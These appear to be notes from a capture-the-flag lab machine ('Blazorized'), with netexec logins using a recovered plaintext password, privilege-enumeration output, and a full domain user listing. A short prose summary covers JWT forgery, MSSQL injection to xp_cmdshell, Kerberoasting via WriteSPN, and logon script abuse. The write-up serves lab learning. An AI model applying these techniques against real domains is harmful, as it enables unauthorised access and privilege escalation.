kali@kali ~> netexec wmi blazorized.htb ldap -u 'RSA_4810' -p '(Ni7856Do9854Ki05Ng0005 #)'
RPC         10.10.11.22     135    DC1              [*] Windows 10 / Server 2019 Build 17763 (name:DC1) (domain:blazorized.htb)
RPC         10.10.11.22     135    DC1              [+] blazorized.htb\RSA_4810:(Ni7856Do9854Ki05Ng0005 #)
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
kali@kali ~> netexec winrm blazorized.htb ldap -u 'RSA_4810' -p '(Ni7856Do9854Ki05Ng0005 #)'
WINRM       10.10.11.22     5985   DC1              [*] Windows 10 / Server 2019 Build 17763 (name:DC1) (domain:blazorized.htb)
WINRM       10.10.11.22     5985   DC1              [+] blazorized.htb\RSA_4810:(Ni7856Do9854Ki05Ng0005 #) (Pwn3d!)
WINRM       10.10.11.22     5985   DC1              Node DC1.BLAZORIZED.HTB successfully set as owned in BloodHound
```



```
    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================

```


```
\Windows\Panther\Unattend.xml
```



```
PS C:\temp> Get-NetUser
Get-NetUser


logoncount                    : 314
badpasswordtime               : 7/1/2024 8:00:42 AM
description                   : Built-in account for administering the computer/domain
distinguishedname             : CN=Administrator,CN=Users,DC=blazorized,DC=htb
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 11/2/2024 6:31:47 AM
name                          : Administrator
objectsid                     : S-1-5-21-2039403211-964143010-2924010611-500
samaccountname                : Administrator
logonhours                    : {255, 255, 255, 255...}
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : 12/31/1600 6:00:00 PM
countrycode                   : 0
whenchanged                   : 11/2/2024 11:31:47 AM
instancetype                  : 4
objectguid                    : cc976606-30dd-483e-a60a-56fe2b3a76b4
lastlogon                     : 11/2/2024 7:37:24 AM
lastlogoff                    : 12/31/1600 6:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata         : {2/2/2024 4:44:23 PM, 2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM,
                                1/10/2024 6:28:26 PM...}
memberof                      : {CN=Group Policy Creator Owners,CN=Users,DC=blazorized,DC=htb,
                                CN=Domain Admins,CN=Users,DC=blazorized,DC=htb, CN=Enterprise
                                Admins,CN=Users,DC=blazorized,DC=htb, CN=Schema
                                Admins,CN=Users,DC=blazorized,DC=htb...}
whencreated                   : 1/8/2024 7:30:25 PM
iscriticalsystemobject        : True
badpwdcount                   : 0
cn                            : Administrator
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated                    : 8196
primarygroupid                : 513
pwdlastset                    : 2/25/2024 11:54:43 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 348260

pwdlastset             : 12/31/1600 6:00:00 PM
logoncount             : 0
badpasswordtime        : 12/31/1600 6:00:00 PM
description            : Built-in account for guest access to the computer/domain
distinguishedname      : CN=Guest,CN=Users,DC=blazorized,DC=htb
objectclass            : {top, person, organizationalPerson, user}
name                   : Guest
objectsid              : S-1-5-21-2039403211-964143010-2924010611-501
samaccountname         : Guest
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 2/2/2024 2:44:29 PM
instancetype           : 4
objectguid             : 86136de6-6e69-45f7-9f13-a314a7934162
lastlogon              : 12/31/1600 6:00:00 PM
lastlogoff             : 12/31/1600 6:00:00 PM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata  : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/8/2024
                         7:31:24 PM...}
memberof               : CN=Guests,CN=Builtin,DC=blazorized,DC=htb
whencreated            : 1/8/2024 7:30:25 PM
badpwdcount            : 0
cn                     : Guest
useraccountcontrol     : ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8197
primarygroupid         : 514
iscriticalsystemobject : True
usnchanged             : 155714

logoncount                    : 0
badpasswordtime               : 12/31/1600 6:00:00 PM
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=blazorized,DC=htb
objectclass                   : {top, person, organizationalPerson, user}
name                          : krbtgt
primarygroupid                : 513
objectsid                     : S-1-5-21-2039403211-964143010-2924010611-502
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
showinadvancedviewonly        : True
accountexpires                : NEVER
cn                            : krbtgt
whenchanged                   : 2/2/2024 4:44:23 PM
instancetype                  : 4
objectguid                    : 2db98603-f485-4617-8373-8724290ffd52
lastlogon                     : 12/31/1600 6:00:00 PM
lastlogoff                    : 12/31/1600 6:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata         : {2/2/2024 4:44:23 PM, 2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM,
                                1/10/2024 6:28:26 PM...}
serviceprincipalname          : kadmin/changepw
memberof                      : CN=Denied RODC Password Replication
                                Group,CN=Users,DC=blazorized,DC=htb
whencreated                   : 1/8/2024 7:31:24 PM
iscriticalsystemobject        : True
badpwdcount                   : 0
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
usncreated                    : 12324
countrycode                   : 0
pwdlastset                    : 1/8/2024 1:31:24 PM
msds-supportedencryptiontypes : 0
usnchanged                    : 159813

logoncount            : 23
badpasswordtime       : 2/1/2024 1:29:42 PM
distinguishedname     : CN=RSA_4810,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : RSA_4810
lastlogontimestamp    : 11/2/2024 6:33:15 AM
userprincipalname     : RSA_4810@blazorized.htb
name                  : RSA_4810
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1107
samaccountname        : RSA_4810
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 11/2/2024 11:33:15 AM
instancetype          : 4
usncreated            : 24627
objectguid            : ed5f4235-a152-4952-bed0-28ae811ee7f4
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/11/2024 2:13:10 AM, 1/10/2024
                        6:28:26 PM...}
memberof              : {CN=Remote_Support_Administrators,CN=Users,DC=blazorized,DC=htb, CN=Remote
                        Management Users,CN=Builtin,DC=blazorized,DC=htb}
lastlogon             : 2/2/2024 11:44:30 AM
badpwdcount           : 0
cn                    : RSA_4810
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/9/2024 11:37:15 AM
primarygroupid        : 513
pwdlastset            : 2/25/2024 11:55:59 AM
usnchanged            : 348316

logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=NU_1056,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : NU_1056
userprincipalname     : NU_1056@blazorized.htb
name                  : NU_1056
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1109
samaccountname        : NU_1056
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/2/2024 2:44:29 PM
instancetype          : 4
usncreated            : 24642
objectguid            : cac4b61a-a983-4102-b934-20b254c75dc4
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/9/2024
                        11:48:10 AM...}
memberof              : CN=Normal_Users,CN=Users,DC=blazorized,DC=htb
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : NU_1056
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/9/2024 11:48:10 AM
primarygroupid        : 513
pwdlastset            : 1/9/2024 5:48:10 AM
usnchanged            : 155719

logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=NU_1057,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
userprincipalname     : NU_1057@blazorized.htb
name                  : NU_1057
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1110
samaccountname        : NU_1057
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/2/2024 2:44:29 PM
instancetype          : 4
usncreated            : 24653
objectguid            : b08e20a0-06c2-4e63-81b8-4607323141a8
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/9/2024
                        11:49:39 AM...}
givenname             : Dimitirs
memberof              : CN=Normal_Users,CN=Users,DC=blazorized,DC=htb
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : NU_1057
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/9/2024 11:49:39 AM
primarygroupid        : 513
pwdlastset            : 1/9/2024 5:49:39 AM
usnchanged            : 155720

logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=NU_1058,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : NU_1058
userprincipalname     : NU_1058@blazorized.htb
name                  : NU_1058
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1111
samaccountname        : NU_1058
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/2/2024 2:44:29 PM
instancetype          : 4
usncreated            : 24663
objectguid            : 734070e5-eb80-4c41-a285-7231d97994be
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/9/2024
                        11:50:22 AM...}
memberof              : CN=Normal_Users,CN=Users,DC=blazorized,DC=htb
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : NU_1058
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/9/2024 11:50:22 AM
primarygroupid        : 513
pwdlastset            : 1/9/2024 5:50:22 AM
usnchanged            : 155721

logoncount            : 125
badpasswordtime       : 2/1/2024 10:14:00 AM
distinguishedname     : CN=NU_1055,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : NU_1055
lastlogontimestamp    : 11/2/2024 6:31:47 AM
userprincipalname     : NU_1055@blazorized.htb
name                  : NU_1055
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1117
samaccountname        : NU_1055
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 11/2/2024 11:31:47 AM
instancetype          : 4
usncreated            : 28923
objectguid            : 6b24f229-0beb-4fc9-89e0-517677771a50
lastlogoff            : 12/31/1600 6:00:00 PM
homedirectory         : C:\Users\NU_1055
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/11/2024 2:11:42 AM, 1/10/2024
                        6:28:26 PM...}
memberof              : {CN=Normal_Users,CN=Users,DC=blazorized,DC=htb, CN=Remote Management
                        Users,CN=Builtin,DC=blazorized,DC=htb,
                        CN=IIS_IUSRS,CN=Builtin,DC=blazorized,DC=htb}
lastlogon             : 11/2/2024 6:31:47 AM
profilepath           : C:\Users\NU_1055
badpwdcount           : 0
cn                    : NU_1055
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/10/2024 1:23:58 PM
primarygroupid        : 513
pwdlastset            : 2/25/2024 11:55:06 AM
usnchanged            : 348259

logoncount            : 2
badpasswordtime       : 1/10/2024 12:03:45 PM
distinguishedname     : CN=RSA_4811,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : RSA_4811
lastlogontimestamp    : 1/10/2024 11:59:42 AM
userprincipalname     : RSA_4811@blazorized.htb
name                  : RSA_4811
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1118
samaccountname        : RSA_4811
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/2/2024 2:44:29 PM
instancetype          : 4
usncreated            : 28940
objectguid            : 692fca91-dd2a-4a7c-bc7c-8418bbaaccf5
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/10/2024
                        1:36:42 PM...}
memberof              : CN=Remote_Support_Administrators,CN=Users,DC=blazorized,DC=htb
lastlogon             : 1/10/2024 12:04:05 PM
badpwdcount           : 0
cn                    : RSA_4811
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/10/2024 1:36:41 PM
primarygroupid        : 513
pwdlastset            : 1/10/2024 7:36:41 AM
usnchanged            : 155723

logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=RSA_4812,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : RSA_4812
userprincipalname     : RSA_4812@blazorized.htb
name                  : RSA_4812
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1120
samaccountname        : RSA_4812
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/2/2024 2:44:29 PM
instancetype          : 4
usncreated            : 28954
objectguid            : 0acad1cf-e852-4aa4-8c1b-0b86cd6b7c13
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/10/2024
                        1:38:29 PM...}
memberof              : CN=Remote_Support_Administrators,CN=Users,DC=blazorized,DC=htb
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : RSA_4812
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/10/2024 1:38:29 PM
primarygroupid        : 513
pwdlastset            : 1/10/2024 7:38:29 AM
usnchanged            : 155724

logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=RSA_4813,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : RSA_4813
userprincipalname     : RSA_4813@blazorized.htb
name                  : RSA_4813
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1121
samaccountname        : RSA_4813
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/2/2024 2:44:29 PM
instancetype          : 4
usncreated            : 28963
objectguid            : 5640817a-bda3-4bcc-9ad6-3deb54157e62
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/10/2024
                        1:39:06 PM...}
memberof              : CN=Remote_Support_Administrators,CN=Users,DC=blazorized,DC=htb
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : RSA_4813
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/10/2024 1:39:06 PM
primarygroupid        : 513
pwdlastset            : 1/10/2024 7:39:06 AM
usnchanged            : 155725

logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=RSA_4814,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : RSA_4814
userprincipalname     : RSA_4814@blazorized.htb
name                  : RSA_4814
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1122
samaccountname        : RSA_4814
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/2/2024 2:44:29 PM
instancetype          : 4
usncreated            : 28972
objectguid            : ed7c6b6f-2e0b-422d-9633-499ccd38150f
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/10/2024
                        1:39:49 PM...}
memberof              : CN=Remote_Support_Administrators,CN=Users,DC=blazorized,DC=htb
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : RSA_4814
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/10/2024 1:39:49 PM
primarygroupid        : 513
pwdlastset            : 1/10/2024 7:39:49 AM
usnchanged            : 155726

logoncount            : 3166
badpasswordtime       : 6/19/2024 9:58:18 AM
distinguishedname     : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : SSA_6010
lastlogontimestamp    : 11/2/2024 6:32:24 AM
userprincipalname     : SSA_6010@blazorized.htb
name                  : SSA_6010
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1124
samaccountname        : SSA_6010
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 11/2/2024 12:30:23 PM
instancetype          : 4
usncreated            : 29007
objectguid            : 8bf3166b-e716-4f91-946c-174e1fb433ed
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {6/19/2024 1:24:50 PM, 6/14/2024 12:40:41 PM, 6/14/2024 12:40:28 PM,6/14/2024 12:38:20 PM...}
memberof              : {CN=Super_Support_Administrators,CN=Users,DC=blazorized,DC=htb, CN=RemoteManagement Users,CN=Builtin,DC=blazorized,DC=htb}
lastlogon             : 11/2/2024 7:38:25 AM
cn                    : SSA_6010
badpwdcount           : 0
scriptpath            : A32FF3AEAA23\shell.ps1
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/10/2024 2:32:00 PM
primarygroupid        : 513
pwdlastset            : 2/25/2024 11:56:55 AM
usnchanged            : 348452

logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=SSA_6011,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : SSA_6011
userprincipalname     : SSA_6011@blazorized.htb
name                  : SSA_6011
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1125
samaccountname        : SSA_6011
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/2/2024 2:44:29 PM
instancetype          : 4
usncreated            : 29016
objectguid            : 44df31f5-91fa-4110-b592-dde27e1b50d2
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/10/2024
                        2:32:32 PM...}
memberof              : CN=Super_Support_Administrators,CN=Users,DC=blazorized,DC=htb
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : SSA_6011
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/10/2024 2:32:32 PM
primarygroupid        : 513
pwdlastset            : 1/10/2024 8:32:32 AM
usnchanged            : 155728

logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=SSA_6012,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : SSA_6012
userprincipalname     : SSA_6012@blazorized.htb
name                  : SSA_6012
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1126
samaccountname        : SSA_6012
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/2/2024 2:44:29 PM
instancetype          : 4
usncreated            : 29025
objectguid            : 8e4b4eaa-7852-439e-a73d-bf122273bd7b
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/10/2024
                        2:33:22 PM...}
memberof              : CN=Super_Support_Administrators,CN=Users,DC=blazorized,DC=htb
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : SSA_6012
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/10/2024 2:33:21 PM
primarygroupid        : 513
pwdlastset            : 1/10/2024 8:33:21 AM
usnchanged            : 155729

logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=SSA_6013,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : SSA_6013
userprincipalname     : SSA_6013@blazorized.htb
name                  : SSA_6013
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1127
samaccountname        : SSA_6013
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/2/2024 2:44:29 PM
instancetype          : 4
usncreated            : 29034
objectguid            : b60ef33d-78cb-4e3c-9820-8f2bee7a0af5
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/10/2024
                        2:33:54 PM...}
memberof              : CN=Super_Support_Administrators,CN=Users,DC=blazorized,DC=htb
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : SSA_6013
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/10/2024 2:33:54 PM
primarygroupid        : 513
pwdlastset            : 1/10/2024 8:33:54 AM
usnchanged            : 155730

logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=LSA_3211,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : LSA_3211
userprincipalname     : LSA_3211@blazorized.htb
name                  : LSA_3211
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1128
samaccountname        : LSA_3211
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/2/2024 2:44:29 PM
instancetype          : 4
usncreated            : 29078
objectguid            : e148a77d-bdff-42a5-a031-0de8e4bff816
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/10/2024
                        5:26:59 PM...}
memberof              : CN=Local_Support_Administrators,CN=Users,DC=blazorized,DC=htb
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : LSA_3211
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/10/2024 5:26:59 PM
primarygroupid        : 513
pwdlastset            : 1/10/2024 11:26:59 AM
usnchanged            : 155731

logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=LSA_3212,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : LSA_3212
userprincipalname     : LSA_3212@blazorized.htb
name                  : LSA_3212
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1129
samaccountname        : LSA_3212
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/2/2024 2:44:29 PM
instancetype          : 4
usncreated            : 29087
objectguid            : de48637d-994b-4b69-8b9f-573d57360769
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/10/2024
                        5:27:42 PM...}
memberof              : CN=Local_Support_Administrators,CN=Users,DC=blazorized,DC=htb
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : LSA_3212
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/10/2024 5:27:42 PM
primarygroupid        : 513
pwdlastset            : 1/10/2024 11:27:42 AM
usnchanged            : 155732

logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=LSA_3213,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : LSA_3213
userprincipalname     : LSA_3213@blazorized.htb
name                  : LSA_3213
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1131
samaccountname        : LSA_3213
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/2/2024 2:44:29 PM
instancetype          : 4
usncreated            : 29099
objectguid            : 15e24ee7-d6f4-436b-94e1-5803d1f7179e
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/10/2024 6:28:26 PM, 1/10/2024
                        5:28:55 PM...}
memberof              : CN=Local_Support_Administrators,CN=Users,DC=blazorized,DC=htb
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : LSA_3213
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/10/2024 5:28:55 PM
primarygroupid        : 513
pwdlastset            : 1/10/2024 11:28:55 AM
usnchanged            : 155733

```




scan -> find DLL thats leaked -> using dnspy to open it we can see that there is JWT being made, we can see the attributes for it and much more as we keep moving on -> we create a JWT token to be able to login to the admin panel at `admin.blazorized.htb` -> after we login since we already know theres a MSSQL database present, what we can do is that we do SQL injection with MSSQL syntax, which works, moving on in this MSSQL injection we enable xp_cmdshell and then we get a shell through that


from NU -> RSA was pretty simple, its a WriteSPN exploit where we write a SPN and then kerbroast to get its hash, then for final privesc what we do is essentially find out that there is a logon script abuse, we exploit this by changing the contents inside of the script while also setting the script path to the local script path for it to work.